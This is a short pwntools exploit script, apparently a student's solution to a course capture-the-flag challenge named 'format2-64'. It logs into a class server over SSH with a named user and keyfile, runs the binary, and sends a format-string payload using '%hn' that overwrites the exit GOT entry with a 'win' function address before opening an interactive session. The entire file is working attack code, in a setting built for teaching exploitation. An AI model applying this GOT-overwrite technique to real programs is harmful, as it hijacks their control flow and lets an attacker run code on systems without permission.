from pwn import * 

context.clear(arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

s = ssh('jjcabral', 'cs4401shell.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/format2r-64_1_d56de1709596ec13a95f8d58c0a0d685/')
p = s.process(['./format2-64'])

winAddr = p64(0x4007e7) # Need to write 7e7 / 2023 to a GOT address
exitAddr = p64(0x601058) # 0x4006f6 value at that address
putsAddr = p64(0x601018) # 0x400676 value at that address

frmt_str = f"%2023p%8$hn"
exploit_str = flat({0:frmt_str, 16:exitAddr})
p.recv()
p.sendline(exploit_str)
p.recv()
p.interactive()
